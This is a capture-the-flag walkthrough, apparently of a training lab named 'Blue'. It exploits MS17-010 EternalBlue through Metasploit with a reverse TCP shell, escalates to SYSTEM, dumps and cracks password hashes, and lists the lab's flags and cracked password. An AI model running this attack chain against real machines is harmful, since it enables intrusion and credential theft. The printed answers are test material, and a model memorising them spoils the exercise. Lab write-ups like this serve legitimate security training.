# Blue

> Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

<br>

### Process

1. Scan the machine:
    - basic port scan: `nmap -T4 10.10.21.139`
    - open ports with port number under 1000 = **3**
    - aggressive port scan on open ports: `nmap -T4 -A -p 135,139,445,3389,49152,49153,49154,49158,49160 10.10.21.139`
    - nmap vulnerability scan: `nmap -sV --script=vuln 10.10.21.139`
    - machine vulnerable to = **ms17-010**
2. Gain access using Metasploit:
    - find exploit code: `search ms17-010`
      - path = **exploit/windows/smb/ms17_010_eternalblue**
      - `use 2`
    - set one option required `options` -> `set RHOSTS 10.10.21.139`
      - option = **RHOSTS**
    - set reverse shell `set payload windows/x64/shell/reverse_tcp` and `exploit`
    - background DOS shell: `Ctrl-Z`
3. Esclate prviliges
   - convert regular DOS shell into meterpreter shell: `sessions -u 2`
     - or `use post/multi/manage/shell_to_meterpreter` -> `set session 2` -> `exploit`
     - name of the post module to use = **post/multi/manage/shell_to_meterpreter**
     - name of options required = **session**
   - escalate to NT AUTHORITY\SYSTEM
     - from meterpreter shell: `getsystem`
     - confirm in DOS shell: `shell` -> `whoami` -> `exit`
   - migrate to process that is running as NT AUTHORITY\SYSTEM
     - view all running processes with: `ps`
     - migrate to process running as NT AUTHORITY\SYSTEM with: `migrate [process_id]` (make take several attempts to find a stable process)
4. Crack non-default user's password 
   - dump the password hashes from the system
     - from meterpreter shell: `hashdump`
     - non-default user's name = **Jon**
   - crack the password hash (used JohnTheRipper)
     - `john --format=nt --wordlists=/usr/share/wordlists/rockyou.txt hash.txt`
     - password = **alqfna22**
5. find all the flags
   - flag 1 is at the system root (C:/)
     - `cd ../../` -> `cat flag1.txt`
     - flag 1 = **flag{access_the_machine}**
   - flag 2 is at the location where passwords are stored within Windows
     - `cd C:\windows\system32\config` -> `cat flag2.txt` 
     - flag 2 = **flag{sam_database_elevated_access}**
   - flag 3 is at a location where Administrators usually have pretty interesting things saved. 
     - `search -f flag3.txt` -> `cat flag3.txt` 
     - flag 3 = **flag{admin_documents_can_be_valuable}**

